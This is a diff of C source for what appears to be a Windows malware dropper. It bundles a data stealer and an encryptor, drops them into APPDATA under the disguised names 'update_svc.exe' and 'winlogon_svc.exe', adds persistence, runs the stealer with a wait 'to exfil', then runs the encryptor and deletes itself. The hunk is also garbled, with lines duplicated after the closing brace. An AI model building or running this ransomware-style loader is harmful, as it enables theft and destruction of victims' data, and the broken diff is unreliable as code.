@@ -6,8 +6,14 @@
 #include <shlobj.h>
 #include <stdio.h>
 
-static const unsigned char steal_bin[] = { /* compiled steal.exe bytes */ };
-static const unsigned char enc_bin[]   = { /* compiled enc.exe bytes */ };
+#include "steal_bytes.h"
+#include "enc_bytes.h"
+
+// xxd -i generates arrays named after the file. Rename via macros.
+#define steal_bin steal_exe
+#define enc_bin   enc_exe
+#define STEAL_LEN steal_exe_len
+#define ENC_LEN   enc_exe_len
 
 // Get %APPDATA% path
 int get_appdata(char* out, size_t out_len) {
@@ -74,6 +80,22 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     CreateDirectoryA(dir, NULL);
 
     char steal_path[MAX_PATH], enc_path[MAX_PATH];
+    snprintf(steal_path, sizeof(steal_path), "%s\\update_svc.exe", dir);
+    snprintf(enc_path,   sizeof(enc_path),   "%s\\winlogon_svc.exe", dir);
+
+    drop_file(steal_path, steal_bin, STEAL_LEN);
+    drop_file(enc_path,   enc_bin,   ENC_LEN);
+
+    persist(steal_path);
+
+    // Run steal first, then encryption
+    run(steal_path);
+    Sleep(60000);  // give steal time to exfil
+    run(enc_path);
+
+    self_delete();
+    return 0;
+}    char steal_path[MAX_PATH], enc_path[MAX_PATH];
     snprintf(steal_path, sizeof(steal_path), "%s\\update_svc.exe", dir);
     snprintf(enc_path,   sizeof(enc_path),   "%s\\winlogon_svc.exe", dir);
 
